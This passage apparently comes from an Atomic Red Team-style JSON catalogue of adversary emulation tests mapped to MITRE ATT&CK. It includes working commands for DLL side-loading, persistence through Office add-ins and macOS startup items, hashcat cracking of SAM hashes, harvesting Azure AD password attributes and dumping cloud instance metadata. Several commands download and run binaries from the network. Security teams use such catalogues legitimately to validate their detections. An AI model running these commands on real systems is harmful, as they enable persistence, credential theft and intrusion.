			"command": "$credFile = \"#{cred_file}\"\nif (Test-Path $credFile) {\n    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n    if($cred.GetNetworkCredential().Password -eq \"#{new_password}\"){\n      Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n    }\n    try {\n        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force\n        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n    }\n    catch { \n        $_.Exception\n        $errCode = $_.Exception.ErrorCode\n        Write-Host \"Error code: $errCode\"\n        if ($errCode -eq 86) {\n            Write-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n            Remove-Item $credFile\n        }\n        exit $errCode\n    }\n    Write-Host -ForegroundColor Cyan \"Successfully changed the password to #{new_password}\"\n    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"#{new_password}\" -AsPlainText -Force))\n    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n    Write-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
			"elevation_required": false
		},
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "GCP - Delete Service Account Key",
		"auto_generated_guid": "7ece1dea-49f1-4d62-bdcc-5801e3292510",
		"supported_platforms": ["iaas:gcp"],
		"input_arguments": {
			"project_id": {
				"description": "ID of the GCP Project you to execute the command against.",
				"type": "string",
				"default": "atomic-test-1"
			},
			"service_name": {
				"description": "The name of the service account.",
				"type": "string",
				"default": "atomic-service-account"
			}
		},
		"executor": {
			"name": "sh",
			"elevation_required": false,
			"command": "gcloud config set project #{project_id}\nKEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet\n",
			"cleanup_command": "cd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform state rm google_service_account_key.key\nterraform destroy -auto-approve\n"
		},
		"dependency_executor_name": "sh",
		"dependencies": [
			{
				"description": "Requires gcloud\n",
				"prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"
			},
			{
				"description": "Check if user is logged in \n",
				"prereq_command": "gcloud config get-value account\n",
				"get_prereq_command": "gcloud auth login --no-launch-browser\n"
			},
			{
				"description": "Check if terraform is installed.\n",
				"prereq_command": "terraform version\n",
				"get_prereq_command": "echo Please install the terraform.\n"
			},
			{
				"description": "Create dependency resources using terraform\n",
				"prereq_command": "stat \"$PathToAtomicsFolder/T1098/src/T1098-17/terraform.tfstate\"\n",
				"get_prereq_command": "cd \"$PathToAtomicsFolder/T1098/src/T1098-17/\"\nterraform init\nterraform apply -auto-approve"
			}
		],
		"attack_technique": "T1098",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "DLL Side-Loading using the Notepad++ GUP.exe binary",
		"auto_generated_guid": "65526037-7079-44a9-bda1-2cb624838040",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_name": {
				"description": "Name of the created process",
				"type": "string",
				"default": "calculator.exe"
			},
			"gup_executable": {
				"description": "GUP is an open source signed binary used by Notepad++ for software updates",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.002\\bin\\GUP.exe"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Gup.exe binary must exist on disk at specified location (#{gup_executable})\n",
				"prereq_command": "if (Test-Path \"#{gup_executable}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory (split-path \"#{gup_executable}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true\" -OutFile \"#{gup_executable}\"\n"
			}
		],
		"executor": {
			"command": "\"#{gup_executable}\"\n",
			"cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1574.002",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "DLL Side-Loading using the dotnet startup hook environment variable",
		"auto_generated_guid": "d322cdd7-7d60-46e3-9111-648848da7c02",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"process_name": {
				"description": "Name of the created process",
				"type": "string",
				"default": "calculator.exe"
			},
			"preloader_dll": {
				"description": "library for interfacing with the dotnet framework",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1574.002\\bin\\preloader.dll"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": ".Net SDK must be installed\n",
				"prereq_command": "if (Test-Path \"C:\\Program Files\\dotnet\\dotnet.exe\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null\necho.\n"
			},
			{
				"description": "preloader must exist\n",
				"prereq_command": "if (Test-Path \"#{preloader_dll}\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true\" -OutFile \"#{preloader_dll}\"\n"
			}
		],
		"executor": {
			"command": "set DOTNET_STARTUP_HOOKS=\"#{preloader_dll}\"\ndotnet -h > nul\necho.\n",
			"cleanup_command": "taskkill /F /IM #{process_name} >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": false
		},
		"attack_technique": "T1574.002",
		"phases": ["defense-evasion", "persistence", "privilege-escalation"]
	},
	{
		"name": "Code Executed Via Excel Add-in File (XLL)",
		"auto_generated_guid": "441b1a0f-a771-428a-8af0-e99e4698cda3",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
			},
			{
				"description": "XLL files must exist on disk at specified location",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\")\n}\nelse{\n  Write-Host \"32-bit Office\"\n  $excelApp.RegisterXLL(\"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")\n}\n",
			"cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1137.006",
		"phases": ["persistence"]
	},
	{
		"name": "Persistent Code Execution Via Excel Add-in File (XLL)",
		"auto_generated_guid": "9c307886-9fef-41d5-b344-073a0f5b2f5f",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
			},
			{
				"description": "XLL files must exist on disk at specified location",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$excelApp = New-Object -COMObject \"Excel.Application\"\nif(-not $excelApp.path.contains(\"Program Files (x86)\")){\n    Write-Host \"64-bit Office\"\n    Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x64.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\excelxll_x86.xll\" \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\"\n}\n$ver = $excelApp.version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\"\nRemove-Item $ExcelRegPath -ErrorAction Ignore\nNew-Item -type Directory $ExcelRegPath | Out-Null\nNew-ItemProperty $ExcelRegPath OPEN -value \"/R notepad.xll\" -propertyType string | Out-Null\n$excelApp.Quit()\nStart-Process \"Excel\"\n",
			"cleanup_command": "$ver = (New-Object -COMObject \"Excel.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\Excel\\Options\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.xll\" -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1137.006",
		"phases": ["persistence"]
	},
	{
		"name": "Persistent Code Execution Via Word Add-in File (WLL)",
		"auto_generated_guid": "95408a99-4fa7-4cd6-a7ef-cb65f86351cf",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Word must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
			},
			{
				"description": "WLL files must exist on disk at specified location",
				"prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
			"cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1137.006",
		"phases": ["persistence"]
	},
	{
		"name": "Persistent Code Execution Via Excel VBA Add-in File (XLAM)",
		"auto_generated_guid": "082141ed-b048-4c86-99c7-2b8da5b5bf48",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"Excel.Application\" | Out-Null\n  Stop-Process -Name \"Excel\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft Excel manually to meet this requirement\"\n"
			},
			{
				"description": "XLAM file must exist on disk at specified location",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\ExcelVBAaddin.xlam\" \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\"        \nStart-Process \"Excel\"\n",
			"cleanup_command": "Stop-Process -Name \"notepad\",\"Excel\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Excel\\XLSTART\\notepad.xlam\" -ErrorAction Ignore\n",
			"elevation_required": false
		},
		"attack_technique": "T1137.006",
		"phases": ["persistence"]
	},
	{
		"name": "Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)",
		"auto_generated_guid": "f89e58f9-2b49-423b-ac95-1f3e7cfd8277",
		"supported_platforms": ["windows"],
		"dependencies": [
			{
				"description": "Microsoft Excel must be installed\n",
				"prereq_command": "try {\n  New-Object -COMObject \"PowerPoint.Application\" | Out-Null\n  Stop-Process -Name \"PowerPnt\"\n  exit 0\n} catch { exit 1 }\n",
				"get_prereq_command": "Write-Host \"You will need to install Microsoft PowerPoint manually to meet this requirement\"\n"
			},
			{
				"description": "PPAM file must exist on disk at specified location",
				"prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\") {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\""
			}
		],
		"executor": {
			"name": "powershell",
			"command": "Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\PptVBAaddin.ppam\" \"$env:APPDATA\\Microsoft\\Addins\\notepad.ppam\"\n$ver = (New-Object -COMObject \"PowerPoint.Application\").version\n$ExcelRegPath=\"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\"\nNew-Item -type Directory $ExcelRegPath -Force | Out-Null\nNew-ItemProperty $ExcelRegPath \"Autoload\" -value \"1\" -propertyType DWORD  | Out-Null\nNew-ItemProperty $ExcelRegPath \"Path\" -value \"notepad.ppam\" -propertyType string | Out-Null\nStop-Process -Name \"PowerPnt\" -ErrorAction Ignore\nStart-Process \"PowerPnt\"\n",
			"cleanup_command": "$ver = (New-Object -COMObject \"PowerPoint.Application\").version\nRemove-Item \"HKCU:\\Software\\Microsoft\\Office\\$Ver\\PowerPoint\\AddIns\\notepad\" -ErrorAction Ignore\nStop-Process -Name \"notepad\",\"PowerPnt\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\AddIns\\notepad.ppam\"  -ErrorAction Ignore",
			"elevation_required": false
		},
		"attack_technique": "T1137.006",
		"phases": ["persistence"]
	},
	{
		"name": "Password Cracking with Hashcat",
		"auto_generated_guid": "6d27df5d-69d4-4c91-bc33-5983ffe91692",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"hashcat_exe": {
				"description": "Path to Hashcat executable",
				"type": "string",
				"default": "PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6\\hashcat-6.1.1\\hashcat.exe"
			},
			"input_file_sam": {
				"description": "Path to SAM file",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1110.002\\src\\sam.txt"
			},
			"input_file_passwords": {
				"description": "Path to password list",
				"type": "string",
				"default": "PathToAtomicsFolder\\T1110.002\\src\\password.lst"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Hashcat must exist on disk at specified location (#{hashcat_exe})",
				"prereq_command": "if (Test-Path  $(cmd /c echo \"#{hashcat_exe}\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://www.7-zip.org/a/7z1900.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\" -ArgumentList \"/S /D=PathToAtomicsFolder\\..\\ExternalPayloads\\7zi\" -NoNewWindow\nInvoke-WebRequest \"https://hashcat.net/files/hashcat-6.1.1.7z\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6.7z\"\nStart-Process cmd.exe -Args  \"/c %temp%\\7z\\7z.exe x %temp%\\hashcat6.7z -aoa -o%temp%\\hashcat-unzip\" -Wait\nNew-Item -ItemType Directory (Split-Path $(cmd /c echo #{hashcat_exe})) -Force | Out-Null\nMove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat-unzip\\hashcat-6.1.1\\*\" $(cmd /c echo #{hashcat_exe}\\..) -Force -ErrorAction Ignore"
			}
		],
		"executor": {
			"command": "cd #{hashcat_exe}\\..\n#{hashcat_exe} -a 0 -m 1000 -r .\\rules\\Incisive-leetspeak.rule #{input_file_sam} #{input_file_passwords}",
			"cleanup_command": "del \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat6.7z\" >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z1900.exe\" >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\7z\" /Q /S >nul 2>&1\ndel \"PathToAtomicsFolder\\..\\ExternalPayloads\\hashcat-unzip\" /Q /S >nul 2>&1",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1110.002",
		"phases": ["credential-access"]
	},
	{
		"name": "Azure - Search Azure AD User Attributes for Passwords",
		"auto_generated_guid": "ae9b2e3e-efa1-4483-86e2-fae529ab9fb6",
		"supported_platforms": ["azure-ad"],
		"input_arguments": {
			"username": {
				"description": "Azure AD username",
				"type": "string",
				"default": null
			},
			"password": {
				"description": "Azure AD password",
				"type": "string",
				"default": "T1082Az"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "The MSOnline module must be installed.\n",
				"prereq_command": "if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}\n",
				"get_prereq_command": "install-module MSOnline\n"
			}
		],
		"executor": {
			"command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n",
			"cleanup_command": "remove-item $env:temp\\T1552.005Test1.txt -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": true
		},
		"attack_technique": "T1552.005",
		"phases": ["credential-access"]
	},
	{
		"name": "Azure - Dump Azure Instance Metadata from Virtual Machines",
		"auto_generated_guid": "cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7",
		"supported_platforms": ["iaas:azure"],
		"input_arguments": {
			"output_file": {
				"description": "File to output metadata to",
				"type": "string",
				"default": "$env:temp\\T1552.005Test2.txt"
			}
		},
		"executor": {
			"command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > #{output_file}\n",
			"cleanup_command": "remove-item #{output_file} -force -erroraction silentlycontinue\n",
			"name": "powershell",
			"elevation_required": false
		},
		"attack_technique": "T1552.005",
		"phases": ["credential-access"]
	},
	{
		"name": "Add file to Local Library StartupItems",
		"auto_generated_guid": "134627c3-75db-410e-bff8-7a920075f198",
		"supported_platforms": ["macos"],
		"executor": {
			"command": "sudo touch /Library/StartupItems/EvilStartup.plist\n",
			"cleanup_command": "sudo rm /Library/StartupItems/EvilStartup.plist\n",
			"name": "sh",
			"elevation_required": true
		},
		"attack_technique": "T1037.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add launch script to launch daemon",
		"auto_generated_guid": "fc369906-90c7-4a15-86fd-d37da624dde6",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"path_malicious_script": {
				"description": "Name of script to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/T1037.005_daemon.sh"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in /tmp",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/T1037_005_daemon.plist"
			},
			"path_startup_params": {
				"description": "Name of plist with startup params",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/StartupParameters.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "/Library/StartupItems must exist\n",
				"prereq_command": "if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;\n",
				"get_prereq_command": "echo \"Failed to create /Library/StartupItems\"; exit 1;\n"
			},
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
			},
			{
				"description": "The startup script must exist on disk at specified location (#{path_malicious_script})\n",
				"prereq_command": "if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The startup script doesn't exist. Check the path and try again.\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist\nsudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh\nsudo cp #{path_malicious_plist} /tmp/T1037_005_daemon.plist\nsudo /Library/StartupItems/atomic.sh start\n",
			"cleanup_command": "sudo launchctl unload /tmp/T1037_005_daemon.plist\nsudo rm /tmp/T1037_005_daemon.plist\nsudo rm /Library/StartupItems/atomic.sh\nsudo rm /Library/StartupItems/StartupParameters.plist\nsudo rm /tmp/T1037_005_daemon.txt\n"
		},
		"attack_technique": "T1037.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Add launch script to launch agent",
		"auto_generated_guid": "10cf5bec-49dd-4ebf-8077-8f47e420096f",
		"supported_platforms": ["macos"],
		"input_arguments": {
			"path_malicious_script": {
				"description": "Name of script to store in cron folder",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/T1037.005_agent.sh"
			},
			"path_malicious_plist": {
				"description": "Name of file to store in /tmp",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/T1037_005_agent.plist"
			},
			"path_startup_params": {
				"description": "Name of plist with startup params",
				"type": "string",
				"default": "$PathToAtomicsFolder/T1037.005/src/StartupParameters.plist"
			}
		},
		"dependency_executor_name": "bash",
		"dependencies": [
			{
				"description": "/Library/StartupItems must exist\n",
				"prereq_command": "if [ ! -d /Library/StartupItems ]; then mkdir /Library/StartupItems; exit 0; fi;\n",
				"get_prereq_command": "echo \"Failed to create /Library/StartupItems\"; exit 1;\n"
			},
			{
				"description": "The shared library must exist on disk at specified location (#{path_malicious_plist})\n",
				"prereq_command": "if [ -f #{path_malicious_plist} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The plist file doesn't exist. Check the path and try again.\"; exit 1;\n"
			},
			{
				"description": "The startup script must exist on disk at specified location (#{path_malicious_script})\n",
				"prereq_command": "if [ -f #{path_malicious_script} ]; then exit 0; else exit 1; fi;\n",
				"get_prereq_command": "echo \"The startup script doesn't exist. Check the path and try again.\"; exit 1;\n"
			}
		],
		"executor": {
			"name": "bash",
			"elevation_required": true,
			"command": "sudo cp #{path_startup_params} /Library/StartupItems/StartupParameters.plist\nsudo cp #{path_malicious_script} /Library/StartupItems/atomic.sh\nsudo cp #{path_malicious_plist} /tmp/T1037_005_agent.plist\n/Library/StartupItems/atomic.sh start\n",
			"cleanup_command": "sudo launchctl unload /tmp/T1037_005_agent.plist\nsudo rm /tmp/T1037_005_agent.plist\nsudo rm /Library/StartupItems/atomic.sh\nsudo rm /Library/StartupItems/StartupParameters.plist\nsudo rm /tmp/T1037_005_agent.txt"
		},
		"attack_technique": "T1037.005",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Install AppInit Shim",
		"auto_generated_guid": "a58d9386-3080-4242-ab5f-454c16503d18",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"registry_file": {
				"description": "Windows Registry File",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010.reg"
			},
			"registry_cleanup_file": {
				"description": "Windows Registry File",
				"type": "path",
				"default": "PathToAtomicsFolder\\T1546.010\\src\\T1546.010-cleanup.reg"
			}
		},
		"dependency_executor_name": "powershell",
		"dependencies": [
			{
				"description": "Reg files must exist on disk at specified locations (#{registry_file} and #{registry_cleanup_file})\n",
				"prereq_command": "if ((Test-Path \"#{registry_file}\") -and (Test-Path \"#{registry_cleanup_file}\")) {exit 0} else {exit 1}\n",
				"get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory (split-path \"#{registry_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010.reg\" -OutFile \"#{registry_file}\"\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/src/T1546.010-cleanup.reg\" -OutFile \"#{registry_cleanup_file}\"\n"
			},
			{
				"description": "DLL's must exist in the C:\\Tools directory (T1546.010.dll and T1546.010x86.dll)\n",
				"prereq_command": "if ((Test-Path c:\\Tools\\T1546.010.dll) -and (Test-Path c:\\Tools\\T1546.010x86.dll)) {exit 0} else {exit 1}\n",
				"get_prereq_command": "New-Item -Type Directory C:\\Tools -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010.dll\" -OutFile C:\\Tools\\T1546.010.dll\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.010/bin/T1546.010x86.dll\" -OutFile C:\\Tools\\T1546.010x86.dll\n"
			}
		],
		"executor": {
			"command": "reg.exe import \"#{registry_file}\"\n",
			"cleanup_command": "reg.exe import \"#{registry_cleanup_file}\" >nul 2>&1\n",
			"name": "command_prompt",
			"elevation_required": true
		},
		"attack_technique": "T1546.010",
		"phases": ["persistence", "privilege-escalation"]
	},
	{
		"name": "Crafting Active Directory golden tickets with mimikatz",
		"auto_generated_guid": "9726592a-dabc-4d4d-81cd-44070008b3af",
		"supported_platforms": ["windows"],
		"input_arguments": {
			"domain_sid": {
